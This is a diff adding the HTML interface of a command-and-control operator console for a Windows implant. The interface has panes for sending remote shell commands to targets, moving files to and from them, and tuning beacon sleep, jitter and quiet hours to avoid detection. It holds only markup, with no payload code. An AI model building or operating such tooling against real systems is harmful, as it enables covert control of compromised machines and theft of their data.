@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>c2 · console</title>
+    <link rel="stylesheet" href="./app.css">
+</head>
+
+<body>
+    <div id="app">
+
+        <header id="topbar">
+            <span class="brand">c2<span class="dot">·</span>console</span>
+            <span id="conn" class="pill dead">offline</span>
+            <span class="grow"></span>
+            <span id="clock" class="mono dim">--:--:--</span>
+            <button id="btn-refresh" class="ghost" title="refresh now">↻</button>
+        </header>
+
+        <aside id="sidebar">
+            <div class="side-head">
+                <span>sessions</span>
+                <span id="sess-count" class="badge">0</span>
+            </div>
+            <ul id="sess-list"></ul>
+            <div id="sess-empty" class="empty">no sessions</div>
+        </aside>
+
+        <main id="main">
+
+            <section id="placeholder" class="placeholder">
+                <div class="ph-inner">
+                    <div class="ph-mark">◈</div>
+                    <p>select a session</p>
+                </div>
+            </section>
+
+            <section id="session-panel" class="hidden">
+
+                <div id="sess-header">
+                    <div class="sh-main">
+                        <div id="sh-host" class="sh-host">—</div>
+                        <div id="sh-meta" class="sh-meta mono"></div>
+                    </div>
+                    <div class="sh-actions">
+                        <button id="btn-results" class="ghost">results</button>
+                        <button id="btn-exit" class="danger">exit</button>
+                        <button id="btn-kill" class="danger">forget</button>
+                    </div>
+                </div>
+
+                <div id="tabs">
+                    <button class="tab active" data-tab="shell">shell</button>
+                    <button class="tab" data-tab="files">files</button>
+                    <button class="tab" data-tab="beacon">beacon</button>
+                    <button class="tab" data-tab="results">output</button>
+                </div>
+
+                <div class="pane active" data-pane="shell">
+                    <div id="term" class="term mono"></div>
+                    <form id="shell-form" class="input-row">
+                        <span class="prompt mono">$</span>
+                        <input id="shell-input" class="mono" type="text" autocomplete="off" spellcheck="false"
+                            placeholder="command — cmd.exe /c ... on target">
+                        <button type="submit">send</button>
+                    </form>
+                    <div class="hint mono dim">output arrives on the next beacon · see the "output" tab</div>
+                </div>
+
+                <div class="pane" data-pane="files">
+                    <div class="grid2">
+                        <div class="card">
+                            <h3>download</h3>
+                            <p class="dim">reads a file from the target. bytes return as hex in the output tab.</p>
+                            <div class="input-row">
+                                <input id="dl-path" class="mono" type="text" placeholder="C:\Windows\win.ini">
+                                <button id="btn-dl">download</button>
+                            </div>
+                        </div>
+                        <div class="card">
+                            <h3>upload</h3>
+                            <p class="dim">sends a local file to the target.</p>
+                            <div class="input-row">
+                                <input id="ul-file" type="file">
+                            </div>
+                            <div class="input-row">
+                                <input id="ul-path" class="mono" type="text" placeholder="C:\Users\Public\payload.bin">
+                                <button id="btn-ul">send</button>
+                            </div>
+                            <div id="ul-status" class="mono dim"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="pane" data-pane="beacon">
+                    <div class="card">
+                        <h3>cadence</h3>
+                        <p class="dim">changes the beacon interval at runtime. jitter is % up and down.</p>
+                        <div class="input-row">
+                            <label class="mono">sleep (ms)</label>
+                            <input id="sl-ms" class="mono" type="number" min="1000" step="1000" value="60000">
+                        </div>
+                        <div class="input-row">
+                            <label class="mono">jitter (%)</label>
+                            <input id="sl-jit" class="mono" type="number" min="0" max="95" step="1" value="40">
+                        </div>
+                        <div class="input-row">
+                            <button id="btn-sleep">apply</button>
+                        </div>
+                        <pre id="sl-echo" class="mono dim"></pre>
+                    </div>
+                    <div class="card">
+                        <h3>quiet window</h3>
+                        <p class="dim">defined in the implant at <code>kQuietStartH</code> / <code>kQuietEndH</code>. does not
+                            change at runtime.</p>
+                        <div class="mono" id="quiet-info">—</div>
+                    </div>
+                </div>
+
+                <div class="pane" data-pane="results">
+                    <div class="pane-bar">
+                        <span class="mono dim">polls every 2s while the session is active</span>
+                        <span class="grow"></span>
+                        <label class="mono dim"><input id="res-auto" type="checkbox" checked> auto</label>
+                        <button id="btn-res-clear" class="ghost">clear</button>
+                    </div>
+                    <div id="results-out" class="results mono"></div>
+                </div>
+
+            </section>
+        </main>
+
+        <footer id="statusbar">
+            <span id="sb-msg" class="mono dim">ready</span>
+            <span class="grow"></span>
+            <span class="mono dim">loopback :8443</span>
+        </footer>
+
+    </div>
+    <script src="./app.js"></script>
+</body>
+
+</html>
